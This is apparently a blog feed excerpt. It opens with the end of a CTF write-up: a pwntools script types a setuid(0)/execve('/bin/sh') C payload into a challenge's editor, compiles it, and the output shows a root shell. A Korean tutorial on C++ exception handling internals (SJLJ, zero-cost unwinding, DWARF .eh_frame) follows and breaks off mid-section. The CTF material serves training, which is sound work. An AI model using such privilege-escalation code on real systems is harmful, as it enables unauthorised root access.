<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;sshpass -e ssh -tt ctf@localhost -p 1234 &#x27;bash -i&#x27;&quot;</span>,</span><br><span class="line">            shell=<span class="literal">True</span>, env=&#123;<span class="string">&quot;SSHPASS&quot;</span>: <span class="string">&quot;ctf1234_smiley&quot;</span>&#125;)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_axis</span>(<span class="params">n</span>):</span><br><span class="line">    r.send(<span class="string">b&quot;\x1b&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;set y &quot;</span> + <span class="built_in">str</span>(n).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_key</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        r.send(p8(c))</span><br><span class="line">    set_axis(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():</span><br><span class="line">    set_axis(<span class="number">0</span>)</span><br><span class="line">    r.send(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">    r.send(<span class="string">b&quot;\x7f&quot;</span>)</span><br><span class="line">    set_axis(<span class="number">1</span>)</span><br><span class="line">    r.send(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        r.send(<span class="string">b&quot;\x7f&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compile</span>():</span><br><span class="line">    r.send(<span class="string">b&quot;\x1b&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;compile&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;~$&quot;</span>, <span class="string">b&quot;stty cols 47 rows 4&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;~$&quot;</span>, <span class="string">b&quot;./app&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;main() &#123;setuid(0);execve(\&quot;/bin/sh\&quot;,0,0);&#125;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> payload:</span><br><span class="line">        input_key(c)</span><br><span class="line"></span><br><span class="line">    clean()</span><br><span class="line">    <span class="built_in">compile</span>()</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./ex.py</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">    b<span class="string">&#x27;-----------------------------------------------main() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;      \r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;                                               \r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;-----------------------------------------------\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&quot;:compiletmp/c7fd17d084a218713d385deb3df85bd1.c:1:1: warning: return type defaults to &#x27;int&#x27; [-Wimplicit-int]\r\n&quot;</span></span><br><span class="line">    b<span class="string">&#x27;    1 | main() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;      | ^~~~\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&quot;tmp/c7fd17d084a218713d385deb3df85bd1.c: In function &#x27;main&#x27;:\r\n&quot;</span></span><br><span class="line">    b<span class="string">&quot;tmp/c7fd17d084a218713d385deb3df85bd1.c:1:9: warning: implicit declaration of function &#x27;setuid&#x27; [-Wimplicit-function-declaration]\r\n&quot;</span></span><br><span class="line">    b<span class="string">&#x27;    1 | main() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;      |         ^~~~~~\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&quot;tmp/c7fd17d084a218713d385deb3df85bd1.c:1:19: warning: implicit declaration of function &#x27;execve&#x27; [-Wimplicit-function-declaration]\r\n&quot;</span></span><br><span class="line">    b<span class="string">&#x27;    1 | main() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;      |                   ^~~~~~\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;# &#x27;</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># $ id</span></span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b<span class="string">&#x27;id\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x4 bytes:</span><br><span class="line">    b<span class="string">&#x27;id\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">[DEBUG] Received 0x2c bytes:</span><br><span class="line">    b<span class="string">&#x27;uid=0(root) gid=1000(ctf) groups=1000(ctf)\r\n&#x27;</span></span><br></pre></td></tr></table></figure>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
]]></content>
      <categories>
        <category>Security</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>C++ 예외 처리의 구현</title>
    <url>/2022/07/17/cpp-exception-handling/</url>
    <content><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
<p>C++의 예외 처리에 사용되는 try-catch 구문을 컴파일러 수준에서 어떻게 구현하고 있는지 살펴보겠습니다.</p>
<h2 id="%EC%98%88%EC%99%B8-%EC%B2%98%EB%A6%AC" tabindex="-1">예외 처리</h2>
<h3 id="try-catch-%EA%B5%AC%EB%AC%B8" tabindex="-1">try-catch 구문</h3>
<p>예외 처리(exception handling)는 프로그램의 실행 중 발생하는 비정상적인 상황에 대응하기 위한 방법론을 의미합니다. 예외 처리를 사용하는 프로그램은 보통 비정상 상황을 발견하고 예외를 일으키는 부분과 예외에 대응하는 부분이 나누어져 있습니다. C++의 예외 처리는 throw 구문으로 예외를 일으키고, try-catch 구문으로 예외에 대응하는 방식을 사용하고 있습니다.</p>
<p>throw 구문은 인자를 받아 예외를 일으킵니다. 일반적으로 <code>std::exception</code> 을 상속한 <code>std::runtime_error</code> 등의 예외 클래스를 인자로 사용하지만, 실제로는 정수형 값이나 문자열 등 아무 값이나 인자로 전달할 수 있습니다.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (password.<span class="built_in">length</span>() &lt; <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> std::<span class="built_in">runtime_error</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>try-catch 구문은 try 블록과 catch 블록으로 나누어집니다. try 블록 이후에 하나 이상의 catch 블록이 이어지며, try 블록의 코드에서 발생한 예외에 대해 catch 블록의 코드가 대응합니다. catch 블록은 자신이 대응할 예외의 타입을 선언하여 해당하는 타입의 예외가 발생하였을 경우에만 코드를 실행합니다. 만약 발생한 예외에 해당하는 catch 블록이 존재하지 않아 예외를 처리할 수 없으면 내부적으로 <code>std::terminate</code> 함수를 호출하여 프로그램을 종료합니다.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">std::string s = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    s.<span class="built_in">substr</span>(<span class="number">11</span>);</span><br><span class="line">&#125; <span class="built_in">catch</span> (<span class="type">const</span> std::exception&amp; e) &#123;</span><br><span class="line">    std::cout &lt;&lt; e.<span class="built_in">what</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;  <span class="comment">// basic_string::substr: __pos (which is 11) &gt; this-&gt;size() (which is 5)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>throw 구문이 예외를 일으키면 프로그램은 호출 스택을 거슬러 올라가며 예외를 처리해줄 catch 블록을 검색합니다. 이 과정을 스택 되감기(stack unwinding)라고 합니다. 스택을 되감는 도중 예외가 발생한 지점과 catch 블록 사이의 코드에서 선언한 객체에 대해서는 자동으로 소멸자를 호출하도록 되어 있습니다. 이는 C++의 RAII(Resource Acquision is Initialization) 원칙을 따르기 위함입니다. RAII는 자원의 누수(leak)를 막기 위해 객체의 수명이 끝날 때 객체가 획득한 자원도 해제하도록 하는 원칙입니다. 예외가 발생한 경우 생성한 객체의 소멸자를 호출하는 코드에 도달할 수 없으므로 직접 호출해주는 것입니다.</p>
<p>다음 그림이 나타내는 코드는 <code>main</code> 함수의 try 블록에서 <code>func</code> 함수를 호출합니다. <code>func</code> 함수는 <code>MyClass</code> 객체를 할당한 후 <code>func2</code> 함수를 호출하고, <code>func2</code> 함수 내에서 예외가 발생합니다. 보라색으로 표시한 코드는 스택을 되감는 부분으로, 스택을 한 번 되감은 후 <code>func</code> 함수가 할당한 <code>MyClass</code> 객채의 소멸자를 호출하고 있습니다.</p>
<p><img src="/images/cpp-exception-handling/1.png" alt="1.png"></p>
<p>위의 내용을 코드로 나타내면 다음과 같습니다. 컴파일하고 실행하면 <code>main</code> 함수의 catch 블록에 도달하기 전 <code>MyClass</code> 객체의 소멸자가 호출되며 “destructor called.” 문자열을 출력합니다.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyClass</span>() &#123; <span class="built_in">printf</span>(<span class="string">&quot;constructor called.\n&quot;</span>); &#125;</span><br><span class="line">    ~<span class="built_in">MyClass</span>() &#123; <span class="built_in">printf</span>(<span class="string">&quot;destructor called.\n&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func2</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;n: %d\n&quot;</span>, n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) &#123; <span class="keyword">throw</span> <span class="number">1</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MyClass m;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;calling func2.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">func2</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;calling func.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">func</span>();</span><br><span class="line">    &#125; <span class="built_in">catch</span> (<span class="type">const</span> <span class="type">int</span>&amp; e) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;catch block in main.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ g++ eh1.cc -o eh1 -no-pie</span><br><span class="line">$ ./eh1</span><br><span class="line">calling func.</span><br><span class="line">constructor called.</span><br><span class="line">calling func2.</span><br><span class="line">n: 0</span><br><span class="line">destructor called.</span><br><span class="line">catch block in main.</span><br></pre></td></tr></table></figure>
<h3 id="sjlj" tabindex="-1">SJLJ</h3>
<p>try-catch 구문을 이용한 예외처리를 구현하기 위해서는 함수의 범위를 뛰어넘는(non-local) 분기를 사용해야 합니다. 예외가 발생하는 부분과 예외에 대응하는 catch 블록이 항상 같은 함수 내에 있다는 보장이 없기 때문입니다. 초기의 컴파일러들은 try-catch 구문을 <code>setjmp</code> , <code>longjmp</code> 라이브러리 함수를 이용하여 구현하였습니다. 이 방식을 SJLJ 방식이라 합니다.</p>
<p><code>setjmp</code> 함수는 분기를 통해 실행 흐름이 돌아올 곳을 지정합니다. <code>jmp_buf</code> 타입을 인자로 받고, 최초 실행 시 <code>jmp_buf</code> 에 실행 환경(e.g. 스택 포인터, 인스트럭션 포인터 등)을 저장한 후 0을 반환합니다. <code>longjmp</code> 함수는 <code>jmp_buf</code> 타입과 정수형 값 <code>val</code> 을 인자로 받고, 실행 환경을 저장했던 위치로 흐름을 돌려 <code>setjmp</code> 함수를 호출합니다. 호출된 <code>setjmp</code> 함수는 <code>val</code> 을 반환합니다. 이전 문단의 예외 처리 예제를 <code>setjmp</code> , <code>longjmp</code> 함수로 작성하면 다음과 같습니다.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyClass</span>() &#123; <span class="built_in">printf</span>(<span class="string">&quot;constructor called.\n&quot;</span>); &#125;</span><br><span class="line">    ~<span class="built_in">MyClass</span>() &#123; <span class="built_in">printf</span>(<span class="string">&quot;destructor called.\n&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">jmp_buf env;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func2</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;n: %d\n&quot;</span>, n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) &#123; <span class="built_in">longjmp</span>(env, <span class="number">1</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MyClass m;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;calling func2.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">func2</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">setjmp</span>(env) == <span class="number">0</span>) &#123;                 <span class="comment">// try</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;calling func.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">func</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;                                <span class="comment">// catch</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;catch block in main.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./eh2</span><br><span class="line">calling func.</span><br><span class="line">constructor called.</span><br><span class="line">calling func2.</span><br><span class="line">n: 0</span><br><span class="line">catch block in main.</span><br></pre></td></tr></table></figure>
<p>그런데 컴파일하고 실행하면 try-catch 구문을 사용하였을 때와는 다르게 <code>MyClass</code> 의 소멸자가 자동으로 호출되지 않습니다. <code>setjmp</code> 와 <code>longjmp</code> 함수는 단순히 분기만을 수행하기 때문입니다. 따라서 SJLJ 방식의 예외 처리에서 도중에 생성된 객체를 소멸시키기 위해서는 그림과 같이 스택을 하나 두고, 객체를 생성할 때마다 객체와 소멸자를 푸시하여야 합니다. 이후 예외를 발생시킬 때 스택을 순회하며 소멸자를 호출한 후 <code>longjmp</code> 함수를 호출해야 합니다.</p>
<p><img src="/images/cpp-exception-handling/2.png" alt="2.png"></p>
<h3 id="zero-cost-%EC%98%88%EC%99%B8-%EC%B2%98%EB%A6%AC" tabindex="-1">Zero-cost 예외 처리</h3>
<p>SJLJ 방식의 예외 처리는 구현이 단순하지만 예외가 발생하지 않는 상황에서도 오버헤드를 강제한다는 단점이 있습니다. try 블록 하나 당 스택과 <code>jmp_buf</code> 가 하나씩 필요하며, 예외 발생 여부와 관계없이 객체를 생성할 때마다 푸시와 팝을 반복해야 하기 때문입니다. 이 경우 복잡한 프로그램에서는 예외 처리를 사용하는 것만으로 적지 않은 성능 저하를 일으킬 수 있습니다.</p>
<p>인텔(Intel) 사는 2001년 아이테니엄(Itanium, IA-64) 아키텍처를 설계하면서 예외가 없으면 오버헤드도 없는 예외 처리 방식을 제안하였습니다. 이 방식을 zero-cost 예외 처리(zero-cost exception handling)이라고 합니다. 새로운 방식은 컴파일러 개발자들에 의해 채택되어 다른 아키텍처로도 포팅되었고, 지금은 일반적으로 컴파일을 수행하면 기본값으로 적용하는 표준 방식이 되었습니다. Zero-cost 예외 처리의 구현을 살펴보기 위해서는 먼저 랜딩 패드의 개념을 이해해야 합니다.</p>
<p>랜딩 패드(landing pad)는 프로그램 코드의 일부로, 예외가 발생했을 때 대응하거나 객체의 자원 할당을 해제하는 등의 cleanup 작업을 위한 부분입니다. 앞서 컴파일한 <code>eh1</code> 바이너리에는 두 개의 랜딩 패드가 존재합니다. <code>func</code> 함수의 <code>MyClass</code> 객체를 소멸시키는 코드와 <code>main</code> 함수의 catch 블록입니다. <code>func</code> 함수의 그래프를 보면 보라색 블록과 같이 실행 흐름과 동떨어진 코드가 있습니다. 이 코드가 바로 <code>MyClass</code> 객체의 소멸자를 호출하는 랜딩 패드입니다.</p>
<p><img src="/images/cpp-exception-handling/3.png" alt="3.png"></p>
<p><code>main</code> 함수의 그래프에서도 보라색 블록으로 나타낸, 문자열을 출력하고 0을 반환하는 블록으로 이어지는 코드가 있습니다. 이 코드 또한 랜딩 패드이며, 소스 코드 상에서 catch 블록에 해당합니다. 예외가 발생하면 스택 되감기를 수행하면서 <code>func</code> 함수의 랜딩 패드와 <code>main</code> 함수의 랜딩 패드를 순서대로 방문하게 됩니다. 전자는 소멸자 호출 후 <code>_Unwind_Resume</code> 함수를 호출하여 스택 되감기를 계속하지만, 후자는 스택 되감기를 마치고 실행 흐름으로 돌아온다는 차이가 있습니다.</p>
<p><img src="/images/cpp-exception-handling/4.png" alt="4.png"></p>
<p>앞서 try-catch 구문을 사용하면 호출 스택의 중간에서 생성된 객체는 자동으로 소멸자를 호출한다고 하였습니다. 이는 사실 컴파일러가 소멸자 호출이 필요한 함수에 미리 랜딩 패드를 준비하고, 스택 되감기 과정에서 랜딩 패드를 순서대로 방문하도록 하기 때문입니다. 그런데 어떻게 프로그램이 <code>setjmp</code> , <code>longjmp</code> 함수를 사용하지 않고도 실행 흐름을 되돌리고, 랜딩 패드를 찾아서 방문할 수 있을까요? Zero-cost 예외 처리 방식의 내부 원리에 대해 더 깊이 살펴보겠습니다.</p>
<h2 id="dwarf-cfi" tabindex="-1">DWARF CFI</h2>
<p>프로그램이 <code>setjmp</code> , <code>longjmp</code> 함수 없이도 실행 흐름을 돌릴 수 있는 이유는 바이너리의 디버그 데이터에 스택 되감기에 필요한 정보가 인코딩되어있기 때문입니다. DWARF는 ELF 실행 파일을 위한 디버그 데이터 형식으로 소스 코드 수준의 디버깅을 위한 다양한 정보를 제공하고 있습니다. 이 중 호출 프레임 정보(call frame information)가 기록된 <code>.eh_frame</code> 섹션이 바로 스택 되감기에 필요한 부분입니다.</p>
<p>일반적으로 함수를 호출할 때 리턴 주소를 스택에 푸시합니다. 이후 함수 프롤로그에서 이전 함수의 프레임 포인터를 푸시하고, 값을 보존해야 할 레지스터들이 있다면 추가로 푸시합니다. 그렇기 때문에 그림과 같이 스택에서 특정 주소를 기준으로 조사하면 이전 함수의 인스트럭션 포인터, 프레임 포인터, 레지스터 값들을 모두 알아낼 수 있습니다. 이 때 기준이 되는 주소를 CFA(cannonical frame address)라고 하며, 보통 함수를 호출하기 직전의 스택 포인터를 CFA로 정의합니다.</p>
<p><img src="/images/cpp-exception-handling/5.png" alt="5.png"></p>
<p>이전 함수의 프레임에서 사용하는 값을 모두 복원할 수 있다면 스택을 되감을 수 있습니다. <code>.eh_frame</code> 섹션은 이를 위해 개념적으로 다음과 같은 호출 프레임 테이블을 준비합니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOC CFA R0  R1  ... RN</span><br><span class="line">L0</span><br><span class="line">L1</span><br><span class="line">...</span><br><span class="line">LN</span><br></pre></td></tr></table></figure>
<p>테이블에서 LOC 열은 코드 영역의 모든 주소를 나타냅니다. CFA 열은 해당 주소의 코드 문맥에서 CFA를 어떻게 계산하는지 나타냅니다. (e.g. <code>RSP + 8</code>) R1, … , RN 열은 아키텍처의 범용 레지스터들에 대응하며, 이전 프레임에서 사용 중이던 해당 레지스터의 값이 CFA를 기준으로 어디에 대응하는지 나타냅니다. (e.g. <code>*(CFA - 24)</code>) 즉, 이 테이블은 코드 상의 모든 주소에서 이전 함수로 스택을 되감을 수 있도록 필요한 정보를 제공하고 있는 것입니다.</p>
<p>그런데 실제로 모든 주소에 대한 호출 프레임 테이블을 인코딩한다면 바이너리에서 프로그램 코드보다 테이블이 차지하는 비중이 너무 많아 용량이 상당히 커질 것입니다. 따라서 <code>.eh_frame</code> 섹션은 사실 테이블이 아니라 테이블의 특정 행을 어떻게 구성해야 하는지 지시하는 바이트코드로 되어 있습니다. 이 바이트코드는 호출 프레임 인스트럭션(call frame instruction)이라는 별도의 형식을 갖고 있으며, CIE(common information entry)와 FDE(frame description entry)라는 구조체에 나누어 저장되어 있습니다. 런타임에서는 예외가 발생한 주소에 해당하는 CIE와 FDE를 찾은 후 바이트코드가 지시하는 대로 이전 프레임에서 사용하는 값들을 복원하면서 호출 스택을 한 단계씩 되감습니다.</p>
<h3 id="cie%EC%99%80-fde" tabindex="-1">CIE와 FDE</h3>
<p>CIE와 FDE는 이전 프레임의 값들을 복원하기 위한 호출 프레임 인스트럭션들을 비롯하여 여러 가지 정보가 저장된 구조체입니다. CIE는 여러 개의 FDE에서 공통적으로 사용하는 정보을 포함하고 있으며, CIE의 인스트럭션은 FDE의 인스트럭션을 실행하기 전 먼저 실행됩니다. FDE는 특정 함수와 같이 제한적인 주소 범위에서만 유효한 정보를 포함하고 있습니다. CIE의 내용 중 중요한 필드들을 나열하면 다음과 같습니다.</p>
<ol>
<li><code>CIE_id</code>
<ul>
<li>CIE의 식별자입니다.</li>
</ul>
</li>
<li><code>augmentation</code>
<ul>
<li>스택 되감기에 있어 특정 프로그래밍 언어에서 요구하는 내용이 있는지 나타냅니다. 예외 처리와 관련된 내용으로는 personality 루틴의 존재 여부와 LSDA의 위치를 포함하고 있는데, 후술합니다.</li>
</ul>
</li>
<li><code>return_address_register</code>
<ul>
<li>테이블의 R1, … , RN 중 어떤 레지스터의 값이 해당 프레임에서 리턴 주소에 해당하는지 나타냅니다.</li>
</ul>
</li>
<li><code>code_alignment_factor</code>
<ul>
<li>테이블의 행에 해당하는 코드 주소를 계산하기 위해 주어진 오프셋에 곱하는 상수 값인데, 후술합니다.</li>
</ul>
</li>
<li><code>data_alignment_factor</code>
<ul>
<li>스택에서 CFA를 기준으로 특정 주소에 접근하기 위해 주어진 오프셋에 곱하는 상수 값인데, 후술합니다.</li>
</ul>
</li>
<li><code>initial_instructions</code>
<ul>
<li>테이블의 행을 구성하기 위해 가장 먼저 수행해야 하는 호출 프레임 인스트럭션들입니다.</li>
</ul>
</li>
</ol>
<p>FDE의 내용 중 중요한 필드들은 다음과 같습니다.</p>
<ol>
<li><code>CIE_pointer</code>
<ul>
<li>이 FDE가 종속된 CIE를 가리킵니다.</li>
</ul>
</li>
<li><code>initial_location</code>
<ul>
<li>테이블에서 이 FDE가 나타내는 행들의 시작 주소를 가리킵니다.</li>
</ul>
</li>
<li><code>address_range</code>
<ul>
<li>FDE가 나타내는 행들이 시작 주소로부터 몇 바이트만큼 떨어진 주소까지 유효한지 나타냅니다.</li>
</ul>
</li>
<li><code>instructions</code>
<ul>
<li>테이블의 행을 구성하기 위해 수행하는 호출 프레임 인스트럭션들입니다.</li>
</ul>
</li>
</ol>
<p>즉, <code>.eh_frame</code> 섹션에서 CIE와 FDE들의 관계는 그림과 같습니다.</p>
<p><img src="/images/cpp-exception-handling/6.png" alt="6.png"></p>
<h2 id="%ED%98%B8%EC%B6%9C-%ED%94%84%EB%A0%88%EC%9E%84-%EC%9D%B8%EC%8A%A4%ED%8A%B8%EB%9F%AD%EC%85%98" tabindex="-1">호출 프레임 인스트럭션</h2>
<p>호출 프레임 인스트럭션은 특정 주소의 코드에서 이전 프레임을 복원하여 스택을 되감을 수 있는 방법을 지시하는 바이트코드 형식입니다. 일반적으로 CIE에서 CFA와 리턴 주소를 복원하고, FDE에서 프레임 포인터와 같은 나머지 범용 레지스터를 복원합니다. 자주 사용되는 호출 프레임 인스트럭션들은 다음과 같습니다.</p>
<ul>
<li><code>DW_CFA_def_cfa</code>
<ul>
<li>레지스터 <code>RN</code> 과 오프셋 <code>offset</code> 을 받아, CFA를 <code>RN + offset</code> 으로 정의합니다.</li>
</ul>
</li>
<li><code>DW_CFA_def_cfa_offset</code>
<ul>
<li>오프셋 <code>offset</code> 을 받아, CFA를 <code>RN + offset</code> 으로 다시 정의합니다. (<code>RN</code> 은 기존 값을 사용합니다)</li>
</ul>
</li>
<li><code>DW_CFA_def_cfa_register</code>
<ul>
<li>레지스터 <code>RN</code> 을 받아, CFA를 <code>RN + offset</code> 으로 다시 정의합니다. (<code>offset</code> 은 기존 값을 사용합니다)</li>
</ul>
</li>
<li><code>DW_advance_loc</code>
<ul>
<li>상수 <code>delta</code> 를 받아, 코드 주소 <code>initial_location + delta * code_alignment_factor</code> 에 해당하는 새로운 테이블 행을 추가합니다.</li>
</ul>
</li>
<li><code>DW_CFA_offset</code>
<ul>
<li>레지스터 <code>RN</code> 과 오프셋 <code>offset</code> 을 받아, <code>RN</code> 을 주소 <code>CFA + offset * data_alignment_factor</code> 의 값으로 복원합니다.</li>
</ul>
</li>
</ul>
<p>CIE와 FDE에 저장된 호출 프레임 인스트럭션을 <code>readelf</code> 커맨드로 읽기 쉽게 출력할 수 있습니다. <code>readelf</code> 에 <code>--debug-dump=frames</code> 옵션을 주어 <code>eh1</code> 바이너리의 호출 프레임 인스트럭션을 확인해 보겠습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ readelf --debug-dump=frames eh1</span><br><span class="line">Contents of the .eh_frame section:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00000000 0000000000000014 00000000 CIE</span><br><span class="line">  Version:               1</span><br><span class="line">  Augmentation:          &quot;zR&quot;</span><br><span class="line">  Code alignment factor: 1</span><br><span class="line">  Data alignment factor: -8</span><br><span class="line">  Return address column: 16</span><br><span class="line">  Augmentation data:     1b</span><br><span class="line">  DW_CFA_def_cfa: r7 (rsp) ofs 8</span><br><span class="line">  DW_CFA_offset: r16 (rip) at cfa-8</span><br><span class="line">  DW_CFA_nop</span><br><span class="line">  DW_CFA_nop</span><br><span class="line"></span><br><span class="line">00000018 0000000000000010 0000001c FDE cie=00000000 pc=0000000000401130..000000000040115f</span><br><span class="line">  DW_CFA_advance_loc: 4 to 0000000000401134</span><br><span class="line">  DW_CFA_undefined: r16 (rip)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><code>CIE_id</code> 가 <code>00000000</code> 인 CIE의 각종 필드와 인스트럭션, 그리고 이 CIE에 종속된 FDE들의 인스트럭션들을 확인할 수 있습니다. CIE의 인스트럭션들은 <code>DW_CFA_def_cfa</code> 로 CFA를 정의하고 <code>DW_CFA_offset</code> 으로 R16 (<code>rip</code>)을 복원합니다. <code>return_address_register</code> 필드가 16이므로 복원한 R16이 이 프레임의 리턴 주소임을 알 수 있습니다.</p>
<p><code>func2</code> 함수의 주소 범위에 대한 FDE를 살펴보며 호출 프레임 인스트럭션을 분석해 보겠습니다. <code>func</code> 함수는 주소 <code>0x401216</code> 에 위치하며, 함수 프롤로그에서 이전 함수의 <code>rbp</code> 값을 스택에 푸시합니다.</p>
